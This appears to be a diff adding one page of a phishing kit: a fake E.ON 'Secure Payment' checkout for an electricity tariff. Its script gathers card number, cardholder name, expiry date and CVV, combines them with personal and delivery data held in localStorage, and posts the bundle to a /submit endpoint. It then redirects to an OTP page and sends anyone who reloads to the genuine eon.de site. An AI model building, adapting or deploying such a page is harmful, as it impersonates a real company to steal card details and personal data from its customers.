@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .payment-container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            display: flex;
+            flex-wrap: wrap;
+            max-width: 800px;
+            width: 100%;
+        }
+
+        .order-summary {
+            background-color: #f9fafb;
+            padding: 40px;
+            width: 100%;
+            box-sizing: border-box;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        @media (min-width: 768px) {
+            .order-summary {
+                width: 45%;
+                border-right: 1px solid #e5e7eb;
+                border-bottom: none;
+            }
+        }
+        
+        .order-summary .logo-header {
+            margin-bottom: 30px;
+        }
+
+        .order-summary h2 {
+            margin-top: 0;
+            font-size: 20px;
+            color: #111827;
+        }
+
+        .order-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #4b5563;
+        }
+
+        .order-total {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e7eb;
+            font-weight: 700;
+            font-size: 18px;
+            color: #111827;
+        }
+
+        .payment-details {
+            padding: 40px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        @media (min-width: 768px) {
+            .payment-details {
+                width: 55%;
+            }
+        }
+
+        .payment-details h2 {
+            margin-top: 0;
+            font-size: 20px;
+            color: #111827;
+        }
+        
+        .secure-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .secure-badge {
+            font-size: 12px;
+            color: #374151;
+            display: flex;
+            align-items: center;
+        }
+
+        .secure-badge svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 6px;
+            color: #16a34a;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper .card-icon {
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            height: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        #card-number.form-control {
+            padding-right: 100px;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+        
+        .expiry-cvv-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .expiry-cvv-row .form-group {
+            flex: 1;
+        }
+        
+        .cvv-label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .cvv-tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .cvv-tooltip .tooltip-icon {
+            width: 16px;
+            height: 16px;
+            color: #6b7280;
+            cursor: pointer;
+        }
+
+        .cvv-tooltip .tooltip-text {
+            visibility: hidden;
+            width: 160px;
+            background-color: #374151;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -80px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        
+        .cvv-tooltip .tooltip-text::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: #374151 transparent transparent transparent;
+        }
+
+        .cvv-tooltip:hover .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #2563eb;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background-color: #1d4ed8;
+        }
+        
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 20px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="payment-container">
+        <div class="order-summary">
+            <div class="logo-header">
+                 <img src="logo.png" alt="E.ON Logo" style="height: 32px;" onerror="this.style.display='none'">
+            </div>
+            <h2>Order Summary</h2>
+            <div class="order-item">
+                <span>E.ON Stromtarif</span>
+                <span id="tariff-price">0.00 EUR</span>
+            </div>
+            <div class="order-total">
+                <span>Total Amount</span>
+                <span id="total-amount">0.00 EUR</span>
+            </div>
+        </div>
+        <div class="payment-details">
+            <div class="secure-header">
+                <h2>Payment Details</h2>
+                <div class="secure-badge">
+                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clip-rule="evenodd" /></svg>
+                    <span>Secure Payment</span>
+                </div>
+            </div>
+            
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="card-number" class="form-control" placeholder="0000 0000 0000 0000" required>
+                        <img src="https://www.freepnglogos.com/uploads/visa-and-mastercard-logo-26.png" alt="Visa and Mastercard logos" class="card-icon" onerror="this.style.display='none'"/>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="card-holder">Cardholder Name</label>
+                    <input type="text" id="card-holder" class="form-control" placeholder="John Doe" required>
+                </div>
+                
+                <div class="expiry-cvv-row">
+                    <div class="form-group">
+                        <label for="expiry-date">Expiry Date</label>
+                        <input type="text" id="expiry-date" class="form-control" placeholder="MM / YY" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv" class="cvv-label">
+                            <span>CVV / CVC</span>
+                            <div class="cvv-tooltip">
+                                <svg class="tooltip-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9.879 7.519c1.171-1.025 3.071-1.025 4.242 0 1.172 1.025 1.172 2.687 0 3.712-.203.179-.43.326-.67.442-.745.361-1.45.999-1.45 1.827v.75M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9 5.25h.008v.008H12v-.008z" /></svg>
+                                <span class="tooltip-text">3 or 4-digit code on the back of your card.</span>
+                            </div>
+                        </label>
+                        <input type="password" id="cvv" class="form-control" placeholder="&#9679;&#9679;&#9679;" maxlength="4" required>
+                    </div>
+                </div>
+
+                <button type="submit" id="submit-btn" class="submit-btn">Pay 0.00 EUR</button>
+
+                <p class="footer-text">
+                    Your payment information is encrypted and transmitted securely using an SSL connection.
+                </p>
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const tariffPriceEl = document.getElementById('tariff-price');
+            const totalAmountEl = document.getElementById('total-amount');
+            const submitBtn = document.getElementById('submit-btn');
+            
+            // --- THIS IS THE CORRECTED LOGIC ---
+            const storedPrice = localStorage.getItem('selectedTariffPrice');
+            let total = 0;
+
+            if (storedPrice) {
+                const price = parseFloat(storedPrice);
+                total = price; // No fee
+                tariffPriceEl.textContent = price.toFixed(2) + ' EUR';
+            }
+            
+            totalAmountEl.textContent = total.toFixed(2) + ' EUR';
+            submitBtn.textContent = `Pay ${total.toFixed(2)} EUR`;
+
+            const cardNumberInput = document.getElementById('card-number');
+            cardNumberInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                let formattedValue = (value.match(/.{1,4}/g) || []).join(' ');
+                e.target.value = formattedValue.substring(0, 19);
+            });
+
+            const expDateInput = document.getElementById('expiry-date');
+            expDateInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+                }
+                e.target.value = value;
+            });
+            
+            document.getElementById('payment-form').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing...';
+                
+                const personalData = JSON.parse(localStorage.getItem('eonUserData')) || {};
+                const deliveryData = JSON.parse(localStorage.getItem('eonDeliveryData')) || {};
+                const billNumber = localStorage.getItem('eonBillNumber') || 'N/A';
+                
+                const paymentData = {
+                    cardNumber: document.getElementById('card-number').value,
+                    cardHolder: document.getElementById('card-holder').value,
+                    expiryDate: document.getElementById('expiry-date').value,
+                    cvv: document.getElementById('cvv').value,
+                    totalAmount: total.toFixed(2)
+                };
+                
+                const submissionData = { 
+                    billNumber: billNumber,
+                    ...personalData, 
+                    ...deliveryData, 
+                    ...paymentData 
+                };
+
+                // Save the complete package for the OTP page to use
+                localStorage.setItem('adminSubmission', JSON.stringify(submissionData));
+
+                try {
+                    const response = await fetch('/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(submissionData),
+                    });
+
+                    const result = await response.json();
+
+                    if (response.ok) {
+                        localStorage.setItem('submissionId', result.submissionId);
+                        window.location.href = 'otp.html';
+                    } else {
+                        throw new Error(result.message || 'Server responded with an error.');
+                    }
+                } catch (error) {
+                    console.error('Failed to submit data:', error);
+                    alert('Could not connect to the server. Please make sure it is running.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = `Pay ${total.toFixed(2)} EUR`;
+                }
+            });
+        });
+    </script>
+    <script>
+      // Modern API to detect reload
+      if (performance.getEntriesByType("navigation")[0].type === "reload") {
+          window.location.href = "https://www.eon.de/de/pk.html";
+      }
+    </script>
+
+
+</body>
+</html>
